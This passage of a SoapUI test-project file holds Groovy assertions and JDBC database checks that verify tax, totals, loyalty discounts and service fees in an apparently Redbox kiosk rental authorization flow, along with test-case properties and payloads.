 */</scriptText></con:configuration></con:assertion><con:assertion type="GroovyScriptAssertion" name="Check Amounts" id="62dae791-ac46-4245-b0bd-42288e2bb164" disabled="true"><con:configuration><scriptText>import java.text.DecimalFormat;
Round4 = new DecimalFormat("#.####");

//Get Rental Count
def numRentals = context.expand( '${#TestCase#RentalCount}' ).toBigDecimal();
def numPurchases = context.expand( '${#TestCase#PurchaseCount}' ).toBigDecimal();
def HasPhysicalPurchase = context.expand( '${#TestCase#HasPhysicalPurchase}' );

//Get the actual values from JDBC response
def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context )
def holder = groovyUtils.getXmlHolder( "Check Transaction#ResponseAsXml");
def actualRentalTaxAmount = holder.getNodeValue("//RENTALTAXAMOUNT[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualPurchaseTaxAmount = holder.getNodeValue("//PURCHASETAXAMOUNT[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualRentalTaxRate = holder.getNodeValue("//RENTALTAXRATE[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualPurchaseTaxRate = holder.getNodeValue("//PURCHASETAXRATE[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualGrandTotal = holder.getNodeValue("//GRANDTOTAL[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualDiscountedSubTotal = holder.getNodeValue("//DISCOUNTEDSUBTOTAL[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualSubTotal = holder.getNodeValue("//SUBTOTAL[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualAuthAmount = holder.getNodeValue("//AUTHAMOUNT[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualPromotionValue = holder.getNodeValue("//PROMOTIONVALUE[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualSalesTaxAmount = holder.getNodeValue("//SALESTAXAMOUNT[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualShoppingCartType = holder.getNodeValue("//SHOPPINGCARTTYPE[1]").toInteger();
def actualRentalType = holder.getNodeValue("//RENTALTYPE[1]").toInteger();
def actualIsOffline = holder.getNodeValue("//ISOFFLINE[1]").toInteger();

//Get the expected values from TestCase properties; calculated in "Encoded Message Body (Authorize)"
def expectedRentalTaxAmount = context.expand( '${#TestCase#RentalTaxAmount}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedPurchaseTaxAmount = context.expand( '${#TestCase#PurchaseTaxAmount}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedRentalTaxRate = context.expand( '${#TestCase#RentalTaxRate}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedPurchaseTaxRate = context.expand( '${#TestCase#PurchaseTaxRate}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedDigitalPurchaseTaxRate = context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedGrandTotal = context.expand( '${#TestCase#TransactionTotal}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedDiscountedSubTotal = context.expand( '${#TestCase#DiscountedSubTotal}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedSubTotal = context.expand( '${#TestCase#SubTotal}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedPromotionValue = context.expand( '${#TestCase#PromoValue}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedSalesTaxAmount = (expectedRentalTaxAmount + expectedPurchaseTaxAmount).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);

//Validations
// rental type is 1 if online and 2 if offline (3 is web)
assert (actualRentalType == 1);
assert (actualIsOffline == 0);
assert (actualDiscountedSubTotal == expectedDiscountedSubTotal);
assert (actualGrandTotal == expectedGrandTotal);
assert (actualSubTotal == expectedSubTotal);
assert (actualAuthAmount == expectedGrandTotal);
assert (actualPromotionValue == expectedPromotionValue);
assert (actualSalesTaxAmount == expectedSalesTaxAmount);
//amounts will be 0 if there were none of that type
if (numRentals == 0) 
{
	assert actualRentalTaxAmount.toBigDecimal() == 0;
	assert actualRentalTaxRate == 0;
} 
else 
{
	assert actualRentalTaxAmount.toBigDecimal() == expectedRentalTaxAmount.toBigDecimal();
	assert actualRentalTaxRate == expectedRentalTaxRate;	
}
//amounts will be 0 if there were none of that type
if (numPurchases == 0) 
{
	assert actualPurchaseTaxAmount.toBigDecimal() == 0;
	assert actualPurchaseTaxRate == 0;
} 
else 
{
	assert actualPurchaseTaxAmount.toBigDecimal() == expectedPurchaseTaxAmount.toBigDecimal();
	if (HasPhysicalPurchase == 'true')
	{
		assert actualPurchaseTaxRate == expectedPurchaseTaxRate;
	}
	else
	{
		assert actualPurchaseTaxRate == expectedDigitalPurchaseTaxRate;
	}
	
}
// 1 = only rentals, 2 = only purchases, 3 = both
if (numRentals > 0 &amp;&amp; numPurchases == 0)
	assert actualShoppingCartType == 1
else if (numRentals == 0 &amp;&amp; numPurchases > 0)
	assert actualShoppingCartType == 2
else
	assert actualShoppingCartType == 3
	</scriptText></con:configuration></con:assertion><con:assertion type="XPath Match" id="6d8ac62a-fe7e-4618-977f-63861f2c2f20" name="Match content of [TRANSACTION_STATUS]"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/TRANSACTION_STATUS[1]/text()</path><content>2</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="XPath Match" id="d1b45fee-cd43-4f09-b272-367adbe8f895" name="Match content of [KIOSKCLIENT_ID]"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/KIOSKCLIENT_ID[1]/text()</path><content>${#TestCase#KioskId}</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="GroovyScriptAssertion" id="9f988f0b-54b8-4bed-9fd9-9cf3a9dce0b7" name="ServiceFee - Validations"><con:configuration><scriptText>import java.text.DecimalFormat;
Round4 = new DecimalFormat("#.####");
def enableServiceFee = context.expand( '${#TestCase#EnableServiceFee}' )
def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context )
def holder = groovyUtils.getXmlHolder( "Check Transaction#ResponseAsXml");
def actualAuthAmount = holder.getNodeValue("//AMOUNT[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualServiceFee = holder.getNodeValue("//SERVICEFEE[1]")
if (enableServiceFee == 'true' &amp;&amp; actualAuthAmount > 0)
{	
	def serviceFeeAmount = context.expand( '${#TestCase#ServiceFeeAmount}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP)
	assert (actualServiceFee.toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP) == serviceFeeAmount.toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP));
}
else
{
	assert (actualServiceFee == null);
}</scriptText></con:configuration></con:assertion><con:properties><con:property><con:name>TnxId</con:name><con:value>${#TestCase#TransactionID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="jdbc" name="Check Invoice Details" id="05543cfb-67d7-42ca-8fae-194de1932c36"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>MerchantService</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB102.rb.local:1433;databaseName=MerchantService;integratedSecurity=true</con:connectionString><con:password>tes</con:password><con:connectionProperties/><con:query>SELECT TOP 1
	i.[Status], 
	i.[System], 
	i.CreatedBy, 
	i.StoreNumber,
	i.CollectionMethod,
	ii.[Status]
FROM
	[Invoice] i (nolock)
INNER JOIN [InvoiceItem] ii ON i.OID = ii.Invoice
WHERE 
	i.OID = :InvoiceID</con:query><con:assertion type="XPath Match" id="240a02f9-cf29-49b8-bec1-b5f1e1e60717" name="Invoice Status"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/STATUS[1]/text()</path><content>0</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="XPath Match" id="efcc78e9-3208-4611-b3d8-4fbdcd0ddd89" name="Match content of [SYSTEM]"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/SYSTEM[1]/text()</path><content>Rental Systems</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="XPath Match" id="96905afe-9a46-4b0b-9840-dfdfb72b774e" name="Match content of [CREATEDBY]" disabled="true"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/CREATEDBY[1]/text()</path><content>RB\KioskSvc_01_U</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="XPath Match" id="3c2f7519-7ffa-408a-b2e2-fd6ce8cd05da" name="InvoiceItem Status"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/STATUS[2]/text()</path><content>2</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="GroovyScriptAssertion" id="4207b007-8259-4190-b87f-c52ed3829198" name="Collection Method"><con:configuration><scriptText>import java.text.DecimalFormat;
//Round4 = new DecimalFormat("#.####");

def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context );
def invholder = groovyUtils.getXmlHolder( "Check Invoice Details#ResponseAsXml");
def actualCollectionMethod = invholder.getNodeValue("//COLLECTIONMETHOD[1]").toInteger();

//Get the shopping cart type value from Get Transaction test step.
def tnxHolder = groovyUtils.getXmlHolder( "Check Transaction#ResponseAsXml");
def shoppingCartType = tnxHolder.getNodeValue("//SHOPPINGCARTTYPE[1]").toInteger();
if (shoppingCartType == 1)
{
	assert actualCollectionMethod == 6;
}
else
{
	assert actualCollectionMethod == 3;
}</scriptText></con:configuration></con:assertion><con:properties><con:property><con:name>InvoiceID</con:name><con:value>${#TestCase#InvoiceID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="groovy" name="Auth Completed" id="01e36303-cdc6-40bd-b01a-07a296cbb12f"><con:settings/><con:config><script/></con:config></con:testStep><con:setupScript>import groovy.sql.Sql
log.info("Loading SQL Driver for Auth");
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
log.info("End loading SQL Driver for Auth");</con:setupScript><con:tearDownScript><![CDATA[//if results file global property is populated,  
//record the testcase name with id
//add mingle card link if mingle property is set

def file = new File(context.expand( '${ResultsFile}' ))
if (context.expand( '${ResultsFile}' ) != null && file.exists()) {
file.append(testRunner.testCase.name + "</td><td><a href=\"http://mingle:8080/projects/server_platform/cards/" + 
context.expand('${#TestCase#Mingle}') + "\">" +context.expand('${#TestCase#Mingle}') +
"</a></td><td>" + context.expand('${#TestCase#Id}') + '\r\n')
} 
]]></con:tearDownScript><con:properties><con:property><con:name>TransactionID</con:name><con:value>1991328</con:value></con:property><con:property><con:name>InvoiceID</con:name><con:value>2149076162</con:value></con:property><con:property><con:name>CCNumber</con:name><con:value>379039914929709</con:value></con:property><con:property><con:name>CCType</con:name><con:value>1</con:value></con:property><con:property><con:name>DigitalpurchaseTaxAmt</con:name><con:value/></con:property><con:property><con:name>DigitalPurchaseTaxRate</con:name><con:value>0.0000</con:value></con:property><con:property><con:name>PurchaseTaxRate</con:name><con:value>8.0000</con:value></con:property><con:property><con:name>RentalTaxRate</con:name><con:value>9.7500</con:value></con:property><con:property><con:name>UseCredits</con:name><con:value>0</con:value></con:property><con:property><con:name>Email</con:name><con:value>rental.automation@gmail.com</con:value></con:property><con:property><con:name>KioskID</con:name><con:value>1505</con:value></con:property><con:property><con:name>PurchaseFormats</con:name><con:value/></con:property><con:property><con:name>numOfPurchases</con:name><con:value/></con:property><con:property><con:name>RentalFormats</con:name><con:value>11</con:value></con:property><con:property><con:name>numOfRentals</con:name><con:value>2</con:value></con:property><con:property><con:name>PromoCode</con:name><con:value>null</con:value></con:property><con:property><con:name>PromoValue</con:name><con:value>0.00</con:value></con:property><con:property><con:name>PurchaseCount</con:name><con:value>0</con:value></con:property><con:property><con:name>PurchaseBarcodes</con:name><con:value/></con:property><con:property><con:name>PurchaseProductFamily</con:name><con:value/></con:property><con:property><con:name>PurchaseProductType</con:name><con:value/></con:property><con:property><con:name>PurchaseDiscPrice</con:name><con:value/></con:property><con:property><con:name>purchasePayload</con:name><con:value/></con:property><con:property><con:name>RentalCount</con:name><con:value>2</con:value></con:property><con:property><con:name>RentalBarcodes</con:name><con:value>001505074,001505075</con:value></con:property><con:property><con:name>RentalProductFamily</con:name><con:value>Games,Games</con:value></con:property><con:property><con:name>RentalProductType</con:name><con:value>PS4,PS4</con:value></con:property><con:property><con:name>RentalDiscPrice</con:name><con:value>3.00,0</con:value></con:property><con:property><con:name>RentalNonReturnPrice</con:name><con:value>66.00,0</con:value></con:property><con:property><con:name>RentalNonReturnDays</con:name><con:value>22,22</con:value></con:property><con:property><con:name>rentalPayload</con:name><con:value>{"GroupType" : 1,  "Items" : [{"ProductId" : 10580,"Barcode" : "001505074","VendStatus" : 28,"ProductFamily" : "Games","ProductType" : "PS4","MultiDisc" : true,"DiscNumber" : 1,"OfferCode" : null,"Pricing" : {"InitialNight" : 3.00,"ExtraNight" : 3.00,"NonReturn" : 66.00,"Expiration" : 3.00,"NonReturnDays" : 22,"PriceSetId" : 1,"Purchase" : 0,"ProductPriceId" : 0,"InitialDays" : 1,"DefaultInitialNight" : 3.00,"DefaultExtraNight" : 3.00},"BlurayUpsell" : null,"ItemSourceType" : 3},{"ProductId" : 10581,"Barcode" : "001505075","VendStatus" : 28,"ProductFamily" : "Games","ProductType" : "PS4","MultiDisc" : true,"DiscNumber" : 2,"OfferCode" : null,"Pricing" : {"InitialNight" : 0,"ExtraNight" : 0,"NonReturn" : 0,"Expiration" : 0,"NonReturnDays" : 22,"PriceSetId" : 1,"Purchase" : 0,"ProductPriceId" : 0,"InitialDays" : 1,"DefaultInitialNight" : 0,"DefaultExtraNight" : 0},"BlurayUpsell" : null,"ItemSourceType" : 3}],"Totals" : { "TaxRate" : 9.7500,"Subtotal" : 3 ,"DiscountedSubtotal" : 0,"TaxAmount" : 0,"GrandTotal" : 0} }</con:value></con:property><con:property><con:name>SetDaysBack</con:name><con:value>10,20</con:value></con:property><con:property><con:name>authRequestBody</con:name><con:value/></con:property><con:property><con:name>RentalTaxAmount</con:name><con:value>0</con:value></con:property><con:property><con:name>PurchaseTaxAmount</con:name><con:value>0</con:value></con:property><con:property><con:name>TransactionTotal</con:name><con:value>0.00</con:value></con:property><con:property><con:name>DiscountedSubTotal</con:name><con:value>0</con:value></con:property><con:property><con:name>SubTotal</con:name><con:value>3</con:value></con:property><con:property><con:name>IsOffline</con:name><con:value>false</con:value></con:property><con:property><con:name>HasPhysicalPurchase</con:name><con:value>false</con:value></con:property><con:property><con:name>RentalTitleIds</con:name><con:value>10580,10581</con:value></con:property><con:property><con:name>DiscountTitleIds</con:name><con:value>10581</con:value></con:property><con:property><con:name>DiscountProductPrices</con:name><con:value>0</con:value></con:property><con:property><con:name>NonLoyaltyProductId</con:name><con:value/></con:property><con:property><con:name>NonLoyaltyProductPrice</con:name><con:value/></con:property><con:property><con:name>HasLoyaltyDiscount</con:name><con:value>1</con:value></con:property><con:property><con:name>HasPromoDiscount</con:name><con:value>0</con:value></con:property><con:property><con:name>RequestBody</con:name><con:value>payload=%7B%22MessageType%22%3A+%22Authorize%22%2C%22MessageId%22%3A+%226f3b9a56-2daa-47ab-9741-bf93fdd96ac0%22%2C%22EngineVersion%22%3A+%221.27.1.297%22%2C%22BundleVersion%22%3A+%222.27.1.65%22%2C%22KioskId%22%3A+1505%2C%22CustomerProfileNumber%22%3A+%2290855364928109%22%2C%22PropertyBag%22%3A+%7B+%22EarlyIdIndicator%22%3A%22true%22+%7D%2C%22CreditCard%22%3A+%7B%22FirstName%22%3A+%22Redbox%22%2C%22LastName%22%3A+%22Server%22%2C%22Number%22%3A+%22PkzcmkisWuoEqhaqGMvH63pL59JRWyRNjWqH2WGjvxpN3UuWOOP1EyDNJq8EJbsZIGFGAP0I4VOnehGWfkmUd6SHuhL8tzdux%2B4C6cUeZm4vUubyGBE41cJ0lqEMPo711tI0qFjbRdoXuVdtkALQIEh5Fp5jF5N9hqEFlZ%2Bfvbin%2F%2FQrjaBy%2BM%2FNENKucxbVjPinuoWpDrSGmZQ8Job4fZP8Kbp5HBznmepa9FmkcVoyiTIjmm0JxKS06j3yhGnK%2FbYdO4PNH14sV4WGbIzrzEBIWOcWlt9HQB3j2KzHG0PSLfUvaCFdnoLVqRc6%2FkSqsrFnOox8fiaUJBHAGhmuCglCv6JDFxC5%2FTgjRC0RK%2BKM4wM9j9aSZs%2Bsormkl5LQRYWGZEDSSqKxyKHNc%2BkDianPppfSqD7b8a%2BGafIPvwjczWYinMKxH9wKwCSMeyEH093A5Lx87%2FKu5UQ0yx4lBEoz8SQzs1nDdG%2F6lUUEZrAZhj2S9teot6toILaQe41%2FO5fp7I0%2BIuEb5%2FkjYuIJ9P0Bum20DKyxatoJkQx5Q99sVmffOgvDms339JxX0UofN7IjrVqAPnaUxfFOovA9rCxtZBrSFupB8jzg4IK6KIi6%2BHCq%2BbY3XMKS545jkOVeYoC5Wu3D35R3Fujm8AxIU4%2FDUU5ACCeuImlVyFQJMjw%3D%22%2C%22PostalCode%22%3A+%2260181%22%2C%22ExpirationMonth%22%3A+%2212%22%2C%22ExpirationYear%22%3A+%2220%22%2C%22KeyId%22%3A+100002%2C%22CardId%22%3A+%22%2BJ0VLD%2BoBAw2PaOsD4vmZqEcfpINWgAHbT7dBtTUS7s%3D%22%2C%22LastFour%22%3A+%229709%22%2C%22CardType%22%3A+1%2C%22Track2%22%3A+%22Uvsz1VkFitnBuEu5SZYHciVSo59MVSZKXOtINGL%2FMTRSGs4CVRVv2%2FYPu%2FrE9rjZ%2F4bBNS9ed1hkFE%2Frx89OTRQhjgahc4rYylrC1ArOv2%2FM596qZ5lEI2b3TiS3R8A7zMuY4lwc2At7erTsB%2B8YHH%2BWeS5YlNQpP0F80HQlE8cmkWBkEbDi3AChPr3jz%2BIpE0aTDTmRm3M1UpM0KKs4FUgEO5SZV5SCZ%2BpGbqEB7sswVeTp1WxWyQuuIxoDMJsk1wubUYPCzJFUUtlAhL1%2B24C7BjeNFnwHWzJr9sPwSZbUesQMHpdnR38HbrGZE7vyaII5HB2JOgXc6WSqGEfdozXJO7aBVfQOxrxHytz13kYrShGQ4p7WsLi9wTudoJsv8a2CXGBAgvgsyJ9IkDKTV6xNrrF3ncwM7CW0XLkgfEKKfO4K5KDW%2Bstv0IkZ8QxwXq9MoglzQmBrvc2kWyPZVr5kKWPovckSx2eWs%2FzcJTPoIpHqLWmZOAIrvLb%2FVnqURvu81EiCquBhwDHcVGBpUjCeuLv9hgZJp3c2lKpnrZmTV7hakLk3P9Hk8pSJ9WBux%2FMjM%2F3ZavHxXSXhl6GoOU8rzm0fSKeFGEdQ0Bt5OCGKnj2hZavpZzPE4adpfImjNSUZFcvNqFAufCW%2Fawr25ytQvpi99sx5BA7awsRAKc0%3D%22%7D%2C%22TransactionDate%22%3A+%7B%22theDate%22%3A+636818766415140000%2C%22dateTimeKind%22%3A+%22Unspecified%22%2C%22dateString%22%3A+%222018-12-31T12%3A10%3A41.0000514%22%7D%2C%22UseCredits%22%3A+%22OptedOut%22%2C%22ShoppingCart%22%3A+%7B+%22Groups%22%3A+%5B++%7B%22GroupType%22+%3A+1%2C++%22Items%22+%3A+%5B%7B%22ProductId%22+%3A+10580%2C%22Barcode%22+%3A+%22001505074%22%2C%22VendStatus%22+%3A+28%2C%22ProductFamily%22+%3A+%22Games%22%2C%22ProductType%22+%3A+%22PS4%22%2C%22MultiDisc%22+%3A+true%2C%22DiscNumber%22+%3A+1%2C%22OfferCode%22+%3A+null%2C%22Pricing%22+%3A+%7B%22InitialNight%22+%3A+3.00%2C%22ExtraNight%22+%3A+3.00%2C%22NonReturn%22+%3A+66.00%2C%22Expiration%22+%3A+3.00%2C%22NonReturnDays%22+%3A+22%2C%22PriceSetId%22+%3A+1%2C%22Purchase%22+%3A+0%2C%22ProductPriceId%22+%3A+0%2C%22InitialDays%22+%3A+1%2C%22DefaultInitialNight%22+%3A+3.00%2C%22DefaultExtraNight%22+%3A+3.00%7D%2C%22BlurayUpsell%22+%3A+null%2C%22ItemSourceType%22+%3A+3%7D%2C%7B%22ProductId%22+%3A+10581%2C%22Barcode%22+%3A+%22001505075%22%2C%22VendStatus%22+%3A+28%2C%22ProductFamily%22+%3A+%22Games%22%2C%22ProductType%22+%3A+%22PS4%22%2C%22MultiDisc%22+%3A+true%2C%22DiscNumber%22+%3A+2%2C%22OfferCode%22+%3A+null%2C%22Pricing%22+%3A+%7B%22InitialNight%22+%3A+0%2C%22ExtraNight%22+%3A+0%2C%22NonReturn%22+%3A+0%2C%22Expiration%22+%3A+0%2C%22NonReturnDays%22+%3A+22%2C%22PriceSetId%22+%3A+1%2C%22Purchase%22+%3A+0%2C%22ProductPriceId%22+%3A+0%2C%22InitialDays%22+%3A+1%2C%22DefaultInitialNight%22+%3A+0%2C%22DefaultExtraNight%22+%3A+0%7D%2C%22BlurayUpsell%22+%3A+null%2C%22ItemSourceType%22+%3A+3%7D%5D%2C%22Totals%22+%3A+%7B+%22TaxRate%22+%3A+9.7500%2C%22Subtotal%22+%3A+3+%2C%22DiscountedSubtotal%22+%3A+0%2C%22TaxAmount%22+%3A+0%2C%22GrandTotal%22+%3A+0%7D+%7D%5D%2C%22Discounts%22%3A+%5B%7B%22ProductId%22%3A+10580%2C%22DiscountType%22%3A+%22Loyalty%22%2C%22PromotionCode%22%3A+null%2C%22RedemptionPoints%22%3A+2500%2C%22Amount%22%3A+3.00%7D%5D%7D%7D+</con:value></con:property><con:property><con:name>CustomerProfileNumber</con:name><con:value>90855364928109</con:value></con:property><con:property><con:name>PurchaseTitleIds</con:name><con:value/></con:property><con:property><con:name>LoyaltyFlag</con:name><con:value>1</con:value></con:property><con:property><con:name>LoyaltyProductPrice</con:name><con:value>3.00</con:value></con:property><con:property><con:name>LoyaltyProductId</con:name><con:value>10580</con:value></con:property><con:property><con:name>testBucket</con:name><con:value/></con:property><con:property><con:name>DiscountPayload</con:name><con:value>{"ProductId": 10580,"DiscountType": "Loyalty","PromotionCode": null,"RedemptionPoints": 2500,"Amount": 3.00}</con:value></con:property><con:property><con:name>CCPayload</con:name><con:value>"CreditCard": {"FirstName": "Redbox","LastName": "Server","Number": "PkzcmkisWuoEqhaqGMvH63pL59JRWyRNjWqH2WGjvxpN3UuWOOP1EyDNJq8EJbsZIGFGAP0I4VOnehGWfkmUd6SHuhL8tzdux+4C6cUeZm4vUubyGBE41cJ0lqEMPo711tI0qFjbRdoXuVdtkALQIEh5Fp5jF5N9hqEFlZ+fvbin//QrjaBy+M/NENKucxbVjPinuoWpDrSGmZQ8Job4fZP8Kbp5HBznmepa9FmkcVoyiTIjmm0JxKS06j3yhGnK/bYdO4PNH14sV4WGbIzrzEBIWOcWlt9HQB3j2KzHG0PSLfUvaCFdnoLVqRc6/kSqsrFnOox8fiaUJBHAGhmuCglCv6JDFxC5/TgjRC0RK+KM4wM9j9aSZs+sormkl5LQRYWGZEDSSqKxyKHNc+kDianPppfSqD7b8a+GafIPvwjczWYinMKxH9wKwCSMeyEH093A5Lx87/Ku5UQ0yx4lBEoz8SQzs1nDdG/6lUUEZrAZhj2S9teot6toILaQe41/O5fp7I0+IuEb5/kjYuIJ9P0Bum20DKyxatoJkQx5Q99sVmffOgvDms339JxX0UofN7IjrVqAPnaUxfFOovA9rCxtZBrSFupB8jzg4IK6KIi6+HCq+bY3XMKS545jkOVeYoC5Wu3D35R3Fujm8AxIU4/DUU5ACCeuImlVyFQJMjw=","PostalCode": "60181","ExpirationMonth": "12","ExpirationYear": "20","KeyId": 100002,"CardId": "+J0VLD+oBAw2PaOsD4vmZqEcfpINWgAHbT7dBtTUS7s=","LastFour": "9709","CardType": 1,"Track2": "Uvsz1VkFitnBuEu5SZYHciVSo59MVSZKXOtINGL/MTRSGs4CVRVv2/YPu/rE9rjZ/4bBNS9ed1hkFE/rx89OTRQhjgahc4rYylrC1ArOv2/M596qZ5lEI2b3TiS3R8A7zMuY4lwc2At7erTsB+8YHH+WeS5YlNQpP0F80HQlE8cmkWBkEbDi3AChPr3jz+IpE0aTDTmRm3M1UpM0KKs4FUgEO5SZV5SCZ+pGbqEB7sswVeTp1WxWyQuuIxoDMJsk1wubUYPCzJFUUtlAhL1+24C7BjeNFnwHWzJr9sPwSZbUesQMHpdnR38HbrGZE7vyaII5HB2JOgXc6WSqGEfdozXJO7aBVfQOxrxHytz13kYrShGQ4p7WsLi9wTudoJsv8a2CXGBAgvgsyJ9IkDKTV6xNrrF3ncwM7CW0XLkgfEKKfO4K5KDW+stv0IkZ8QxwXq9MoglzQmBrvc2kWyPZVr5kKWPovckSx2eWs/zcJTPoIpHqLWmZOAIrvLb/VnqURvu81EiCquBhwDHcVGBpUjCeuLv9hgZJp3c2lKpnrZmTV7hakLk3P9Hk8pSJ9WBux/MjM/3ZavHxXSXhl6GoOU8rzm0fSKeFGEdQ0Bt5OCGKnj2hZavpZzPE4adpfImjNSUZFcvNqFAufCW/awr25ytQvpi99sx5BA7awsRAKc0="},</con:value></con:property><con:property><con:name>EstimatedLoyaltyAmount</con:name><con:value>3.00</con:value></con:property><con:property><con:name>RedemptionPoints</con:name><con:value>2500</con:value></con:property><con:property><con:name>EnableServiceFee</con:name><con:value>false</con:value></con:property><con:property><con:name>ServiceFeeTaxRate</con:name><con:value>9.9500</con:value></con:property><con:property><con:name>ServiceFeeAmount</con:name><con:value>0.0900</con:value></con:property><con:property><con:name>ServiceFeePayload</con:name><con:value/></con:property><con:property><con:name>RemainingPromoValue</con:name><con:value/></con:property><con:property><con:name>AllBarcodes</con:name><con:value>001505074,001505075</con:value></con:property><con:property><con:name>BarcodeForTnx</con:name><con:value>001505075</con:value></con:property><con:property><con:name>AppliedPromoValue</con:name><con:value>0</con:value></con:property><con:property><con:name>UpsellOffer</con:name><con:value/></con:property><con:property><con:name>UpsellOfferStatus</con:name><con:value/></con:property><con:property><con:name>UpsellTypeId</con:name><con:value>1,1</con:value></con:property><con:property><con:name>ProductGroupId</con:name><con:value>0,0</con:value></con:property><con:property><con:name>HasUpsell</con:name><con:value/></con:property><con:property><con:name>ItemSourceType</con:name><con:value>0,0</con:value></con:property><con:property><con:name>MNPFlag</con:name><con:value/></con:property><con:property><con:name>DiscountAmountList</con:name><con:value>3.00</con:value></con:property><con:property><con:name>HasOffer</con:name><con:value/></con:property><con:property><con:name>RCFlag</con:name><con:value>0, 0</con:value></con:property><con:property><con:name>rentalRCFlag</con:name><con:value>0, 0</con:value></con:property><con:property><con:name>purchaseRCFlag</con:name><con:value/></con:property><con:property><con:name>MDVFlag</con:name><con:value>1,1</con:value></con:property><con:property><con:name>MDVDiscNumber</con:name><con:value>1,2</con:value></con:property><con:property><con:name>hasMDV</con:name><con:value>true</con:value></con:property><con:property><con:name>PurchaseMDVFlag</con:name><con:value/></con:property><con:property><con:name>PurchaseMDVDiscNumber</con:name><con:value/></con:property><con:property><con:name>RentalMDVFlag</con:name><con:value>true,true</con:value></con:property><con:property><con:name>RentalMDVDiscNumber</con:name><con:value>1,2</con:value></con:property></con:properties><con:reportParameters/><con:breakPoints><con:testStepId>cf2a43da-fb68-4f28-b647-cabab658b5fb</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>c7ac4c10-ab96-4e99-b1ae-b373224e8115</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>86b29e8b-9449-4b42-a501-717ac5b2bccc</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>aee6dc73-e1a0-4123-aabd-fcd972f9608d</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:testCase failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="GCAuthorize" searchProperties="true" timeout="0" wsrmEnabled="false" wsrmVersion="1.0" wsrmAckTo="" amfAuthorisation="false" amfEndpoint="" amfLogin="" amfPassword="" id="9d0133e8-105e-4427-b916-7815d05ba6aa"><con:description/><con:settings/><con:testStep type="jdbc" name="Warmup Script" id="3a3b1d85-a246-4703-ba0e-79e92016e468"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>Select GetDate() As 